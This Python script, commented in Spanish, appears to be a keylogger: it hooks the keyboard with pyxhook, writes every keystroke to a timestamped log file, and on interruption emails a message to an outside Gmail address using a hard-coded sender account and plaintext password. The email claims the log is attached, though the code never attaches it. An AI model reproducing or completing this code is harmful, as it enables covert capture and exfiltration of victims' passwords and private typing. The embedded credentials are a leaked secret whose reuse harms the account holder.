import os
import smtplib
from email.message import EmailMessage
from datetime import datetime
import pyxhook

# Configuración para el envío de correo
email_sender = "holamundoalfonso@gmail.com"
email_password = "Waters_2001"
email_receiver = "quirozruiz054@gmail.com"

def send_email(subject, message):
    try:
        # Configuración del correo
        msg = EmailMessage()
        msg['From'] = email_sender
        msg['To'] = email_receiver
        msg['Subject'] = subject
        msg.set_content(message)

        # Inicio de sesión en el servidor SMTP de Gmail y envío del correo
        with smtplib.SMTP_SSL('smtp.gmail.com', 465) as smtp:
            smtp.login(email_sender, email_password)
            smtp.send_message(msg)
        print("Correo enviado exitosamente")
    except Exception as e:
        print(f"Error al enviar el correo: {e}")

def main():
    # Especifica el nombre del archivo (puede ser cambiado)
    log_file = f'{os.getcwd()}/{datetime.now().strftime("%d-%m-%Y|%H:%M")}.log'

    # La función de registro con el parámetro {event}
    def OnKeyPress(event):
        with open(log_file, "a") as f:
            if event.Ascii == 13:  # 13 es el código ASCII para la tecla Enter
                f.write('\n')
            else:
                f.write(chr(event.Ascii))  # Convierte el código ASCII a carácter y escribe en el archivo

    # Crea un objeto HookManager
    new_hook = pyxhook.HookManager()
    new_hook.KeyDown = OnKeyPress

    new_hook.HookKeyboard()  # Configura el hook

    try:
        new_hook.start()  # Inicia el hook
    except KeyboardInterrupt:
        # El usuario canceló desde la línea de comandos, así que cierra el listener
        new_hook.cancel()
        
        # Al finalizar, enviamos el registro por correo electrónico
        subject = f"Registro de teclas - {datetime.now().strftime('%d-%m-%Y %H:%M')}"
        message = "Hola,\n\nAdjunto encontrarás el registro de las teclas presionadas.\n\nSaludos,\nAlfonso"
        send_email(subject, message)
    except Exception as ex:
        # Escribe excepciones en el archivo de registro para análisis posterior
        msg = f"Error mientras se capturaban los eventos:\n  {ex}"
        print(msg)
        with open(log_file, "a") as f:
            f.write(f"\n{msg}")

if __name__ == "__main__":
    main()
